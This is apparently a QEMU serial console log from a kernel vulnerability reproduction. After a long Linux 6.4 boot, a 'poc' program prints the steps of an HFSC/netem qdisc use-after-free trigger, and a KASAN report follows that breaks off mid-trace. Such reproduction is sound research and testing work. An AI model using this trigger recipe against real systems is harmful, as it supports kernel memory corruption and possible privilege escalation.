bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
c[?7l[2J[0mSeaBIOS (version 1.16.2-debian-1.16.2-1)


iPXE (http://ipxe.org) 00:03.0 CA00 PCI2.10 PnP PMM+7EFCEF00+7EF0EF00 CA00
Press Ctrl-B to configure iPXE (PCI 00:03.0)...                                                                               


Booting from ROM...
c[?7l[2JNo EFI environment detected.
early console in extract_kernel
input_data: 0x0000000004beb3a8
input_len: 0x000000000198a59b
output: 0x0000000001000000
output_len: 0x00000000054fff28
kernel_total_size: 0x0000000005230000
needed_size: 0x0000000005600000
trampoline_32bit: 0x000000000009d000


KASLR disabled: 'nokaslr' on cmdline.


Decompressing Linux... Parsing ELF... No relocation needed... done.
Booting the kernel (entry_offset: 0x0000000000000000).
[    0.000000] Linux version 6.4.0-04322-gc451410ca7e3-dirty (root@buildkitsandbox) (gcc (Debian 12.2.0-14+deb12u1) 12.2.0, GNU ld (GNU Binutils for Debian) 2.40) #1 SMP PREEMPT_DYNAMIC Sun May 17 15:30:49 UTC 2026
[    0.000000] Command line: console=ttyS0 oops=panic panic=-1 nokaslr earlyprintk=serial
[    0.000000] BIOS-provided physical RAM map:
[    0.000000] BIOS-e820: [mem 0x0000000000000000-0x000000000009fbff] usable
[    0.000000] BIOS-e820: [mem 0x000000000009fc00-0x000000000009ffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000000f0000-0x00000000000fffff] reserved
[    0.000000] BIOS-e820: [mem 0x0000000000100000-0x000000007ffdffff] usable
[    0.000000] BIOS-e820: [mem 0x000000007ffe0000-0x000000007fffffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000feffc000-0x00000000feffffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000fffc0000-0x00000000ffffffff] reserved
[    0.000000] printk: bootconsole [earlyser0] enabled
[    0.000000] NX (Execute Disable) protection: active
[    0.000000] SMBIOS 2.8 present.
[    0.000000] DMI: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[    0.000000] Hypervisor detected: KVM
[    0.000000] kvm-clock: Using msrs 4b564d01 and 4b564d00
[    0.000004] kvm-clock: using sched offset of 1732894706 cycles
[    0.014664] clocksource: kvm-clock: mask: 0xffffffffffffffff max_cycles: 0x1cd42e4dffb, max_idle_ns: 881590591483 ns
[    0.041882] tsc: Detected 2995.198 MHz processor
[    0.050341] last_pfn = 0x7ffe0 max_arch_pfn = 0x400000000
[    0.056538] MTRR map: 4 entries (3 fixed + 1 variable; max 19), built from 8 variable MTRRs
[    0.063855] x86/PAT: Configuration [0-7]: WB  WC  UC- UC  WB  WP  UC- WT  
[    0.079735] found SMP MP-table at [mem 0x000f5ba0-0x000f5baf]
[    0.086195] Using GB pages for direct mapping
[    0.095836] Incomplete global flushes, disabling PCID
[    0.096333] RAMDISK: [mem 0x7fe91000-0x7ffdffff]
[    0.112816] ACPI: Early table checksum verification disabled
[    0.119177] ACPI: RSDP 0x00000000000F59D0 000014 (v00 BOCHS )
[    0.126122] ACPI: RSDT 0x000000007FFE1B33 000034 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.136569] ACPI: FACP 0x000000007FFE19DF 000074 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.144453] ACPI: DSDT 0x000000007FFE0040 00199F (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.153519] ACPI: FACS 0x000000007FFE0000 000040
[    0.158860] ACPI: APIC 0x000000007FFE1A53 000080 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.167708] ACPI: HPET 0x000000007FFE1AD3 000038 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.176329] ACPI: WAET 0x000000007FFE1B0B 000028 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.181902] ACPI: Reserving FACP table memory at [mem 0x7ffe19df-0x7ffe1a52]
[    0.186655] ACPI: Reserving DSDT table memory at [mem 0x7ffe0040-0x7ffe19de]
[    0.193442] ACPI: Reserving FACS table memory at [mem 0x7ffe0000-0x7ffe003f]
[    0.200062] ACPI: Reserving APIC table memory at [mem 0x7ffe1a53-0x7ffe1ad2]
[    0.211248] ACPI: Reserving HPET table memory at [mem 0x7ffe1ad3-0x7ffe1b0a]
[    0.218013] ACPI: Reserving WAET table memory at [mem 0x7ffe1b0b-0x7ffe1b32]
[    0.233830] No NUMA configuration found
[    0.241794] Faking a node at [mem 0x0000000000000000-0x000000007ffdffff]
[    0.250636] NODE_DATA(0) allocated [mem 0x7fe8d000-0x7fe90fff]
[    0.257896] Zone ranges:
[    0.262369]   DMA      [mem 0x0000000000001000-0x0000000000ffffff]
[    0.271871]   DMA32    [mem 0x0000000001000000-0x000000007ffdffff]
[    0.278664]   Normal   empty
[    0.282026] Movable zone start for each node
[    0.291999] Early memory node ranges
[    0.295374]   node   0: [mem 0x0000000000001000-0x000000000009efff]
[    0.300582]   node   0: [mem 0x0000000000100000-0x000000007ffdffff]
[    0.306524] Initmem setup node 0 [mem 0x0000000000001000-0x000000007ffdffff]
[    0.318527] On node 0, zone DMA: 1 pages in unavailable ranges
[    0.319677] On node 0, zone DMA: 97 pages in unavailable ranges
[    0.429004] On node 0, zone DMA32: 32 pages in unavailable ranges
[    0.931787] kasan: KernelAddressSanitizer initialized
[    0.957250] ACPI: PM-Timer IO Port: 0x608
[    0.966114] ACPI: LAPIC_NMI (acpi_id[0xff] dfl dfl lint[0x1])
[    0.978793] IOAPIC[0]: apic_id 0, version 17, address 0xfec00000, GSI 0-23
[    0.985179] ACPI: INT_SRC_OVR (bus 0 bus_irq 0 global_irq 2 dfl dfl)
[    0.990348] ACPI: INT_SRC_OVR (bus 0 bus_irq 5 global_irq 5 high level)
[    1.003194] ACPI: INT_SRC_OVR (bus 0 bus_irq 9 global_irq 9 high level)
[    1.012619] ACPI: INT_SRC_OVR (bus 0 bus_irq 10 global_irq 10 high level)
[    1.017928] ACPI: INT_SRC_OVR (bus 0 bus_irq 11 global_irq 11 high level)
[    1.026095] ACPI: Using ACPI (MADT) for SMP configuration information
[    1.032002] ACPI: HPET id: 0x8086a201 base: 0xfed00000
[    1.037416] TSC deadline timer available
[    1.041413] smpboot: Allowing 2 CPUs, 0 hotplug CPUs
[    1.045318] kvm-guest: KVM setup pv remote TLB flush
[    1.049583] kvm-guest: setup PV sched yield
[    1.053493] PM: hibernation: Registered nosave memory: [mem 0x00000000-0x00000fff]
[    1.060248] PM: hibernation: Registered nosave memory: [mem 0x0009f000-0x0009ffff]
[    1.067173] PM: hibernation: Registered nosave memory: [mem 0x000a0000-0x000effff]
[    1.072534] PM: hibernation: Registered nosave memory: [mem 0x000f0000-0x000fffff]
[    1.079007] [mem 0x80000000-0xfeffbfff] available for PCI devices
[    1.082169] Booting paravirtualized kernel on KVM
[    1.083932] clocksource: refined-jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 1910969940391419 ns
[    1.126946] setup_percpu: NR_CPUS:64 nr_cpumask_bits:2 nr_cpu_ids:2 nr_node_ids:1
[    1.138512] percpu: Embedded 66 pages/cpu s232104 r8192 d30040 u1048576
[    1.146103] Kernel command line: console=ttyS0 oops=panic panic=-1 nokaslr earlyprintk=serial
[    1.167682] Unknown kernel command line parameters "nokaslr", will be passed to user space.
[    1.174371] random: crng init done
[    1.180829] Dentry cache hash table entries: 262144 (order: 9, 2097152 bytes, linear)
[    1.190926] Inode-cache hash table entries: 131072 (order: 8, 1048576 bytes, linear)
[    1.196068] Fallback order for Node 0: 0 
[    1.196076] Built 1 zonelists, mobility grouping on.  Total pages: 515808
[    1.200670] Policy zone: DMA32
[    1.201453] mem auto-init: stack:all(zero), heap alloc:off, heap free:off
[    1.203032] stackdepot: allocating hash table via alloc_large_system_hash
[    1.214405] stackdepot hash table entries: 1048576 (order: 11, 8388608 bytes, linear)
[    1.254293] Memory: 1692956K/2096632K available (49152K kernel code, 7930K rwdata, 10020K rodata, 5608K init, 3072K bss, 403420K reserved, 0K cma-reserved)
[    1.260254] SLUB: HWalign=64, Order=0-3, MinObjects=0, CPUs=2, Nodes=1
Poking KASLR using RDRAND RDTSC...
[    1.274060] Dynamic Preempt: voluntary
[    1.280601] rcu: Preemptible hierarchical RCU implementation.
[    1.289728] rcu: 	RCU event tracing is enabled.
[    1.293140] rcu: 	RCU restricting CPUs from NR_CPUS=64 to nr_cpu_ids=2.
[    1.299782] 	Trampoline variant of Tasks RCU enabled.
[    1.309236] rcu: RCU calculated value of scheduler-enlistment delay is 100 jiffies.
[    1.314363] rcu: Adjusting geometry for rcu_fanout_leaf=16, nr_cpu_ids=2
[    1.348827] NR_IRQS: 4352, nr_irqs: 440, preallocated irqs: 16
[    1.362364] rcu: srcu_init: Setting srcu_struct sizes based on contention.
[    1.398546] Console: colour VGA+ 80x25
[    1.402225] printk: console [ttyS0] enabled
[    1.402225] printk: console [ttyS0] enabled
[    1.409884] printk: bootconsole [earlyser0] disabled
[    1.409884] printk: bootconsole [earlyser0] disabled
[    1.419927] ACPI: Core revision 20230331
[    1.423648] clocksource: hpet: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 19112604467 ns
[    1.438055] APIC: Switch to symmetric I/O mode setup
[    1.450112] kvm-guest: setup PV IPIs
[    1.460561] ..TIMER: vector=0x30 apic1=0 pin1=2 apic2=-1 pin2=-1
[    1.468395] clocksource: tsc-early: mask: 0xffffffffffffffff max_cycles: 0x2b2c8d6afc8, max_idle_ns: 440795331172 ns
[    1.488764] Calibrating delay loop (skipped) preset value.. 5990.39 BogoMIPS (lpj=2995198)
[    1.490500] x86/cpu: User Mode Instruction Prevention (UMIP) activated
[    1.492976] Last level iTLB entries: 4KB 0, 2MB 0, 4MB 0
[    1.494723] Last level dTLB entries: 4KB 0, 2MB 0, 4MB 0, 1GB 0
[    1.496733] Spectre V1 : Mitigation: usercopy/swapgs barriers and __user pointer sanitization
[    1.497754] Spectre V2 : Mitigation: Enhanced / Automatic IBRS
[    1.499709] Spectre V2 : Spectre v2 / SpectreRSB mitigation: Filling RSB on context switch
[    1.500719] Spectre V2 : Spectre v2 / PBRSB-eIBRS: Retire a single CALL on VMEXIT
[    1.501726] RETBleed: Mitigation: Enhanced IBRS
[    1.502742] Spectre V2 : mitigation: Enabling conditional Indirect Branch Prediction Barrier
[    1.503730] Speculative Store Bypass: Mitigation: Speculative Store Bypass disabled via prctl
[    1.504721] MMIO Stale Data: Unknown: No mitigations
[    1.505957] x86/fpu: Supporting XSAVE feature 0x001: 'x87 floating point registers'
[    1.506720] x86/fpu: Supporting XSAVE feature 0x002: 'SSE registers'
[    1.507715] x86/fpu: Supporting XSAVE feature 0x004: 'AVX registers'
[    1.508710] x86/fpu: xstate_offset[2]:  576, xstate_sizes[2]:  256
[    1.509706] x86/fpu: Enabled xstate features 0x7, context size is 832 bytes, using 'compacted' format.
[    1.543558] Freeing SMP alternatives memory: 44K
[    1.543710] pid_max: default: 32768 minimum: 301
[    1.544902] LSM: initializing lsm=capability,selinux,integrity
[    1.545750] SELinux:  Initializing.
[    1.546858] Mount-cache hash table entries: 4096 (order: 3, 32768 bytes, linear)
[    1.547714] Mountpoint-cache hash table entries: 4096 (order: 3, 32768 bytes, linear)
[    1.552294] smpboot: CPU0: 13th Gen Intel(R) Core(TM) i9-13900H (family: 0x6, model: 0xba, stepping: 0x2)
[    1.553530] RCU Tasks: Setting shift to 1 and lim to 1 rcu_task_cb_adjust=1.
[    1.553894] Performance Events: unsupported p6 CPU model 186 no PMU driver, software events only.
[    1.554899] signal: max sigframe size: 1776
[    1.555939] rcu: Hierarchical SRCU implementation.
[    1.556743] rcu: 	Max phase no-delay instances is 400.
[    1.559225] smp: Bringing up secondary CPUs ...
[    1.560396] smpboot: x86: Booting SMP configuration:
[    1.560757] .... node  #0, CPUs:      #1
[    1.569147] smp: Brought up 1 node, 2 CPUs
[    1.570724] smpboot: Max logical packages: 1
[    1.571733] smpboot: Total of 2 processors activated (11980.79 BogoMIPS)
[    1.575776] devtmpfs: initialized
[    1.584529] clocksource: jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 1911260446275000 ns
[    1.584834] futex hash table entries: 512 (order: 3, 32768 bytes, linear)
[    1.586493] PM: RTC time: 15:32:28, date: 2026-05-17
[    1.587245] NET: Registered PF_NETLINK/PF_ROUTE protocol family
[    1.588196] audit: initializing netlink subsys (disabled)
[    1.588883] audit: type=2000 audit(1779031948.671:1): state=initialized audit_enabled=0 res=1
[    1.589146] thermal_sys: Registered thermal governor 'step_wise'
[    1.589729] thermal_sys: Registered thermal governor 'user_space'
[    1.590801] cpuidle: using governor menu
[    1.594079] PCI: Using configuration type 1 for base access
[    1.595043] kprobes: kprobe jump-optimization is enabled. All kprobes are optimized if possible.
[    1.598189] HugeTLB: registered 2.00 MiB page size, pre-allocated 0 pages
[    1.600740] HugeTLB: 28 KiB vmemmap can be freed for a 2.00 MiB page
[    1.609761] ACPI: Added _OSI(Module Device)
[    1.609761] ACPI: Added _OSI(Processor Device)
[    1.610704] ACPI: Added _OSI(3.0 _SCP Extensions)
[    1.616903] ACPI: Added _OSI(Processor Aggregator Device)
[    1.636175] ACPI: 1 ACPI AML tables successfully acquired and loaded
[    1.759183] ACPI: Interpreter enabled
[    1.759811] ACPI: PM: (supports S0 S3 S4 S5)
[    1.760715] ACPI: Using IOAPIC for interrupt routing
[    1.761802] PCI: Using host bridge windows from ACPI; if necessary, use "pci=nocrs" and report a bug
[    1.762725] PCI: Using E820 reservations for host bridge windows
[    1.764397] ACPI: Enabled 2 GPEs in block 00 to 0F
[    1.787387] ACPI: PCI Root Bridge [PCI0] (domain 0000 [bus 00-ff])
[    1.787782] acpi PNP0A03:00: _OSC: OS supports [ASPM ClockPM Segments MSI HPX-Type3]
[    1.788716] acpi PNP0A03:00: _OSC: not requesting OS control; OS requires [ExtendedConfig ASPM ClockPM MSI]
[    1.789844] acpi PNP0A03:00: fail to add MMCONFIG information, can't access extended configuration space under this bridge
[    1.791053] PCI host bridge to bus 0000:00
[    1.791724] pci_bus 0000:00: root bus resource [io  0x0000-0x0cf7 window]
[    1.792743] pci_bus 0000:00: root bus resource [io  0x0d00-0xffff window]
[    1.793717] pci_bus 0000:00: root bus resource [mem 0x000a0000-0x000bffff window]
[    1.794740] pci_bus 0000:00: root bus resource [mem 0x80000000-0xfebfffff window]
[    1.795720] pci_bus 0000:00: root bus resource [mem 0x100000000-0x17fffffff window]
[    1.796742] pci_bus 0000:00: root bus resource [bus 00-ff]
[    1.797920] pci 0000:00:00.0: [8086:1237] type 00 class 0x060000
[    1.808099] pci 0000:00:01.0: [8086:7000] type 00 class 0x060100
[    1.819471] pci 0000:00:01.1: [8086:7010] type 00 class 0x010180
[    1.821717] pci 0000:00:01.1: reg 0x20: [io  0xc040-0xc04f]
[    1.823575] pci 0000:00:01.1: legacy IDE quirk: reg 0x10: [io  0x01f0-0x01f7]
[    1.823719] pci 0000:00:01.1: legacy IDE quirk: reg 0x14: [io  0x03f6]
[    1.824728] pci 0000:00:01.1: legacy IDE quirk: reg 0x18: [io  0x0170-0x0177]
[    1.825725] pci 0000:00:01.1: legacy IDE quirk: reg 0x1c: [io  0x0376]
[    1.827740] pci 0000:00:01.3: [8086:7113] type 00 class 0x068000
[    1.830008] pci 0000:00:01.3: quirk: [io  0x0600-0x063f] claimed by PIIX4 ACPI
[    1.830740] pci 0000:00:01.3: quirk: [io  0x0700-0x070f] claimed by PIIX4 SMB
[    1.833598] pci 0000:00:02.0: [1234:1111] type 00 class 0x030000
[    1.836378] pci 0000:00:02.0: reg 0x10: [mem 0xfd000000-0xfdffffff pref]
[    1.841513] pci 0000:00:02.0: reg 0x18: [mem 0xfebf0000-0xfebf0fff]
[    1.849893] pci 0000:00:02.0: reg 0x30: [mem 0xfebe0000-0xfebeffff pref]
[    1.852675] pci 0000:00:02.0: Video device with shadowed ROM at [mem 0x000c0000-0x000dffff]
[    1.868513] pci 0000:00:03.0: [8086:100e] type 00 class 0x020000
[    1.870921] pci 0000:00:03.0: reg 0x10: [mem 0xfebc0000-0xfebdffff]
[    1.873517] pci 0000:00:03.0: reg 0x14: [io  0xc000-0xc03f]
[    1.880354] pci 0000:00:03.0: reg 0x30: [mem 0xfeb80000-0xfebbffff pref]
[    1.892983] ACPI: PCI: Interrupt link LNKA configured for IRQ 10
[    1.894568] ACPI: PCI: Interrupt link LNKB configured for IRQ 10
[    1.897045] ACPI: PCI: Interrupt link LNKC configured for IRQ 11
[    1.898546] ACPI: PCI: Interrupt link LNKD configured for IRQ 11
[    1.899118] ACPI: PCI: Interrupt link LNKS configured for IRQ 9
[    1.903124] iommu: Default domain type: Translated 
[    1.903723] iommu: DMA domain TLB invalidation policy: lazy mode 
[    1.905263] SCSI subsystem initialized
[    1.909454] ACPI: bus type USB registered
[    1.910755] usbcore: registered new interface driver usbfs
[    1.912597] usbcore: registered new interface driver hub
[    1.913690] usbcore: registered new device driver usb
[    1.915288] pps_core: LinuxPPS API ver. 1 registered
[    1.915743] pps_core: Software ver. 5.3.6 - Copyright 2005-2007 Rodolfo Giometti <giometti@linux.it>
[    1.916825] PTP clock support registered
[    1.919508] Advanced Linux Sound Architecture Driver Initialized.
[    1.923064] NetLabel: Initializing
[    1.923704] NetLabel:  domain hash size = 128
[    1.924725] NetLabel:  protocols = UNLABELED CIPSOv4 CALIPSO
[    1.925704] NetLabel:  unlabeled traffic allowed by default
[    1.929046] PCI: Using ACPI for IRQ routing
[    1.931088] pci 0000:00:02.0: vgaarb: setting as boot VGA device
[    1.931704] pci 0000:00:02.0: vgaarb: bridge control possible
[    1.931704] pci 0000:00:02.0: vgaarb: VGA device added: decodes=io+mem,owns=io+mem,locks=none
[    1.934779] vgaarb: loaded
[    1.935303] hpet0: at MMIO 0xfed00000, IRQs 2, 8, 0
[    1.939775] hpet0: 3 comparators, 64-bit 100.000000 MHz counter
[    1.945072] clocksource: Switched to clocksource kvm-clock
[    1.946895] VFS: Disk quotas dquot_6.6.0
[    1.949985] VFS: Dquot-cache hash table entries: 512 (order 0, 4096 bytes)
[    1.952330] pnp: PnP ACPI init
[    1.956766] pnp: PnP ACPI: found 6 devices
[    1.987211] clocksource: acpi_pm: mask: 0xffffff max_cycles: 0xffffff, max_idle_ns: 2085701024 ns
[    1.990226] NET: Registered PF_INET protocol family
[    1.994434] IP idents hash table entries: 32768 (order: 6, 262144 bytes, linear)
[    2.004972] tcp_listen_portaddr_hash hash table entries: 1024 (order: 2, 16384 bytes, linear)
[    2.007714] Table-perturb hash table entries: 65536 (order: 6, 262144 bytes, linear)
[    2.019745] TCP established hash table entries: 16384 (order: 5, 131072 bytes, linear)
[    2.023338] TCP bind hash table entries: 16384 (order: 7, 524288 bytes, linear)
[    2.025769] TCP: Hash tables configured (established 16384 bind 16384)
[    2.029350] UDP hash table entries: 1024 (order: 3, 32768 bytes, linear)
[    2.038945] UDP-Lite hash table entries: 1024 (order: 3, 32768 bytes, linear)
[    2.041539] NET: Registered PF_UNIX/PF_LOCAL protocol family
[    2.043817] RPC: Registered named UNIX socket transport module.
[    2.052491] RPC: Registered udp transport module.
[    2.054100] RPC: Registered tcp transport module.
[    2.057893] RPC: Registered tcp NFSv4.1 backchannel transport module.
[    2.063093] pci_bus 0000:00: resource 4 [io  0x0000-0x0cf7 window]
[    2.072905] pci_bus 0000:00: resource 5 [io  0x0d00-0xffff window]
[    2.075075] pci_bus 0000:00: resource 6 [mem 0x000a0000-0x000bffff window]
[    2.077017] pci_bus 0000:00: resource 7 [mem 0x80000000-0xfebfffff window]
[    2.078857] pci_bus 0000:00: resource 8 [mem 0x100000000-0x17fffffff window]
[    2.085658] pci 0000:00:01.0: PIIX3: Enabling Passive Release
[    2.092766] pci 0000:00:00.0: Limiting direct PCI/PCI transfers
[    2.095034] PCI: CLS 0 bytes, default 64
[    2.109306] Unpacking initramfs...
[    2.109565] RAPL PMU: API unit is 2^-32 Joules, 0 fixed counters, 10737418240 ms ovfl timer
[    2.142306] clocksource: tsc: mask: 0xffffffffffffffff max_cycles: 0x2b2c8d6afc8, max_idle_ns: 440795331172 ns
[    2.161931] Initialise system trusted keyrings
[    2.175318] workingset: timestamp_bits=56 max_order=19 bucket_order=0
[    2.177776] NFS: Registering the id_resolver key type
[    2.191108] Key type id_resolver registered
[    2.192132] Freeing initrd memory: 1340K
[    2.192713] Key type id_legacy registered
[    2.192869] 9p: Installing v9fs 9p2000 file system support
[    2.250444] Key type asymmetric registered
[    2.251641] Asymmetric key parser 'x509' registered
[    2.253144] Block layer SCSI generic (bsg) driver version 0.4 loaded (major 251)
[    2.258184] io scheduler mq-deadline registered
[    2.259787] io scheduler kyber registered
[    2.273160] input: Power Button as /devices/LNXSYSTM:00/LNXPWRBN:00/input/input0
[    2.279592] ACPI: button: Power Button [PWRF]
[    2.307358] Serial: 8250/16550 driver, 4 ports, IRQ sharing enabled
[    2.309479] 00:04: ttyS0 at I/O 0x3f8 (irq = 4, base_baud = 115200) is a 16550A
[    2.322496] Non-volatile memory driver v1.3
[    2.326725] Linux agpgart interface v0.103
[    2.330953] ACPI: bus type drm_connector registered
[    2.397091] loop: module loaded
[    2.407340] scsi host0: ata_piix
[    2.410438] scsi host1: ata_piix
[    2.414501] ata1: PATA max MWDMA2 cmd 0x1f0 ctl 0x3f6 bmdma 0xc040 irq 14
[    2.423875] ata2: PATA max MWDMA2 cmd 0x170 ctl 0x376 bmdma 0xc048 irq 15
[    2.439117] e100: Intel(R) PRO/100 Network Driver
[    2.442271] e100: Copyright(c) 1999-2006 Intel Corporation
[    2.450308] e1000: Intel(R) PRO/1000 Network Driver
[    2.455337] e1000: Copyright (c) 1999-2006 Intel Corporation.
[    2.612754] ata2: found unknown device (class 0)
[    2.617479] ata2.00: ATAPI: QEMU DVD-ROM, 2.5+, max UDMA/100
[    2.628984] scsi 1:0:0:0: CD-ROM            QEMU     QEMU DVD-ROM     2.5+ PQ: 0 ANSI: 5
[    2.669931] sr 1:0:0:0: [sr0] scsi3-mmc drive: 4x/4x cd/rw xa/form2 tray
[    2.677593] cdrom: Uniform CD-ROM driver Revision: 3.20
[    3.593315] hrtimer: interrupt took 2884537 ns
[    3.988277] ACPI: \_SB_.LNKC: Enabled at IRQ 11
[    4.784434] e1000 0000:00:03.0 eth0: (PCI:33MHz:32-bit) 52:54:00:12:34:56
[    4.791157] e1000 0000:00:03.0 eth0: Intel(R) PRO/1000 Network Connection
[    4.796658] e1000e: Intel(R) PRO/1000 Network Driver
[    4.799670] e1000e: Copyright(c) 1999 - 2015 Intel Corporation.
[    4.805396] sky2: driver version 1.30
[    4.813121] usbcore: registered new interface driver usblp
[    4.818947] usbcore: registered new interface driver usb-storage
[    4.821448] i8042: PNP: PS/2 Controller [PNP0303:KBD,PNP0f13:MOU] at 0x60,0x64 irq 1,12
[    4.842492] serio: i8042 KBD port at 0x60,0x64 irq 1
[    4.847511] serio: i8042 AUX port at 0x60,0x64 irq 12
[    4.854526] rtc_cmos 00:05: RTC can wake from S4
[    4.856354] input: AT Translated Set 2 keyboard as /devices/platform/i8042/serio0/input/input1
[    4.876436] rtc_cmos 00:05: registered as rtc0
[    4.882864] rtc_cmos 00:05: alarms up to one day, y3k, 242 bytes nvram, hpet irqs
[    4.902743] device-mapper: ioctl: 4.48.0-ioctl (2023-03-01) initialised: dm-devel@redhat.com
[    4.913058] intel_pstate: CPU model not supported
[    4.915747] hid: raw HID events driver (C) Jiri Kosina
[    4.919455] usbcore: registered new interface driver usbhid
[    4.922216] usbhid: USB HID core driver
[    4.924864] netem: version 1.3
[    4.936801] Initializing XFRM netlink socket
[    4.938701] NET: Registered PF_INET6 protocol family
[    4.951588] Segment Routing with IPv6
[    4.957105] In-situ OAM (IOAM) with IPv6
[    4.959599] sit: IPv6, IPv4 and MPLS over IPv4 tunneling driver
[    4.967181] NET: Registered PF_PACKET protocol family
[    4.969944] 9pnet: Installing 9P2000 support
[    4.974735] Key type dns_resolver registered
[    4.982098] IPI shorthand broadcast: enabled
[    5.027371] sched_clock: Marking stable (4915015233, 112230283)->(5874823772, -847578256)
[    5.032929] registered taskstats version 1
[    5.043977] Loading compiled-in X.509 certificates
[    5.074075] PM:   Magic number: 10:340:538
[    5.079327] printk: console [netcon0] enabled
[    5.081267] netconsole: network logging started
[    5.090683] cfg80211: Loading compiled-in X.509 certificates for regulatory database
[    5.104491] kworker/u4:1 (52) used greatest stack depth: 29536 bytes left
[    5.142533] Loaded X.509 cert 'sforshee: 00b28ddf47aef9cea7'
[    5.144971] platform regulatory.0: Direct firmware load for regulatory.db failed with error -2
[    5.146295] ALSA device list:
[    5.152527] cfg80211: failed to load regulatory.db
[    5.187161]   No soundcards found.
[    5.238526] Freeing unused kernel image (initmem) memory: 5608K
[    5.240793] Write protecting the kernel read-only data: 59392k
[    5.256856] Freeing unused kernel image (rodata/data gap) memory: 220K
[    5.303483] x86/mm: Checked W+X mappings: passed, no W+X pages found.
[    5.305133] Run /init as init process
[    5.319387] mount (56) used greatest stack depth: 28760 bytes left

secb: rootfs ready
---- poc begin ----
[poc] lo up with 127.0.0.1/8; starting trigger
[poc] create hfsc root 1:0
[    5.390026] ==================================================================
[    5.391287] BUG: KASAN: slab-use-after-free in rb_last+0x64/0x80
[    5.392419] Read of size 8 at addr ffff888009fa00c8 by task poc/62
[poc] create hfsc class 1:1 (FSC-only)
[poc] create hfsc class 1:2 (FSC-only)
[poc] create netem 2:0 (duplicate=~0u) under 1:1
[poc] create pfifo 3:0 under 1:2
[poc] setup_uaf: send to class 1:1 (double activation)
[poc] delete class 1:1 (leaves dangling vt_tree ref)
[poc] trigger_uaf: send to cla[    5.405820] 
ss 1:2
[    5.415240] CPU: 0 PID: 62 Comm: poc Not tainted 6.4.0-04322-gc451410ca7e3-dirty #1
[    5.421688] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[    5.430112] Call Trace:
[    5.430941]  <TASK>
[    5.431702]  dump_stack_lvl+0x36/0x50
[    5.433028]  print_report+0xcf/0x660
[    5.434297]  ? rb_last+0x64/0x80
[    5.435598]  kasan_report+0xc7/0x100
[    5.438050]  ? rb_last+0x64/0x80
[    5.439998]  rb_last+0x64/0x80
[    5.444185]  init_vf.constprop.0+0x351/0xe20
[    5.445079]  hfsc_enqueue+0x7d0/0xee0
[    5.449940]  ? __kasan_slab_alloc+0x6e/0x70
[    5.451369]  ? kmalloc_reserve+0x110/0x1e0
[    5.452725]  ? __pfx_hfsc_enqueue+0x10/0x10
[    5.457994]  ? _raw_spin_lock+0x80/0xe0
[    5.458834]  dev_qdisc_enqueue+0x3b/0x140
[    5.459724]  ? __pfx_selinux_socket_sock_rcv_skb+0x10/0x10
[    5.460645]  __dev_queue_xmit+0x161f/0x30c0
[    5.461336]  ? selinux_ip_postroute_compat+0x321/0x3d0
[    5.467560]  ? __pfx___dev_queue_xmit+0x10/0x10
[    5.469138]  ? selinux_ip_postroute+0x2ac/0xac0
[    5.475478]  ip_finish_output2+0x6cf/0x18f0
[    5.476380]  ? __pfx_ip_finish_output2+0x10/0x10
[    5.477354]  __ip_finish_output.part.0+0x271/0x950
[    5.479649]  ? __pfx___ip_finish_output.part.0+0x10/0x10
[    5.482156]  ? nf_hook_slow+0xa2/0x170
[    5.483491]  ip_output+0x2c7/0x650
[    5.484660]  ? __pfx_ip_output+0x10/0x10
[    5.485974]  ? __pfx_ip_finish_output+0x10/0x10
[    5.493702]  ? __pfx_ip_generic_getfrag+0x10/0x10
[    5.494513]  ? __pfx_ip_make_skb+0x10/0x10
[    5.495173]  ip_send_skb+0x113/0x150
[    5.495756]  udp_send_skb+0x57d/0x1260
[    5.496442]  udp_sendmsg+0x1757/0x2230
[    5.497046]  ? avc_has_perm_noaudit+0x8a/0x130
[    5.497758]  ? __pfx_ip_generic_getfrag+0x10/0x10
[    5.498520]  ? __pfx_udp_sendmsg+0x10/0x10
[    5.499182]  ? udp_lib_get_port+0x4b9/0x1850
[    5.502795]  ? ip4_datagram_release_cb+0x161/0x7f0
[    5.506875]  ? __pfx_ip4_datagram_release_cb+0x10/0x10
[    5.511939]  ? __pfx_sk_setsockopt+0x10/0x10
[    5.512901]  ? inet_autobind+0x108/0x160
[    5.513831]  ? inet_send_prepare+0x21f/0x2a0
[    5.514808]  ? __pfx_inet_sendmsg+0x10/0x10
[    5.515706]  ? sock_sendmsg+0x138/0x180
[    5.516525]  sock_sendmsg+0x138/0x180
[    5.517318]  __sys_sendto+0x1eb/0x2b0
[    5.518098]  ? __pfx___sys_sendto+0x10/0x10
[    5.523146]  ? __pfx_udp_push_pending_frames+0x10/0x10
[    5.524197]  ? udp_lib_setsockopt+0x52f/0xc00
[    5.525074]  ? __pfx_udp_lib_setsockopt+0x10/0x10
[    5.526238]  ? __pfx___sys_socket+0x10/0x10
[    5.527102]  ? __pfx_ksys_write+0x10/0x10
[    5.530663]  __x64_sys_sendto+0xdb/0x1b0
[    5.531566]  ? exit_to_user_mode_prepare+0x2a/0x110
[    5.532680]  ? syscall_exit_to_user_mode+0x21/0x50
[    5.543928]  do_syscall_64+0x3b/0x90
[    5.544710]  entry_SYSCALL_64_after_hwframe+0x6e/0xd8
[    5.545821] RIP: 0033:0x43b8e3
[    5.546574] Code: 89 01 e9 e0 fe ff ff e8 1b 04 00 00 66 2e 0f 1f 84 00 00 00 00 00 90 80 3d 81 c7 06 00 00 41 89 ca 74 14 b8 2c 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 75 c3 0f 1f 40 00 55 48 83 ec 30 44 89 4c 24
[    5.550052] RSP: 002b:00007ffc4beae608 EFLAGS: 00000202 ORIG_RAX: 000000000000002c
